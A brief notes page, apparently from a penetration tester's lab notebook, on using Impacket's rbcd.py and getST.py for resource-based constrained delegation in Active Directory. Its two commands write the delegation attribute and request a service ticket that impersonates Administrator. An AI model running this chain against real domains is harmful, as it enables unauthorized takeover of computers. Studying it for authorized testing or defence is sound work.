## rbcd.py: choose the operation and read the result

Commands and examples collected from your rbcd.py notes.

### What the result establishes

Read the target computer's allowed-to-act descriptor and resolve the principals it authorizes.

### Prerequisites and common failures

Writing the attribute requires an applicable object right, and the controlled principal must meet the delegation flow's prerequisites.

### Example 1: Resource-Based (RBCD)

Run in: **Notebook example**. Saved as written; may include lab values or terminal output.

```bash
# You have GenericWrite over a computer object -> set msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
```
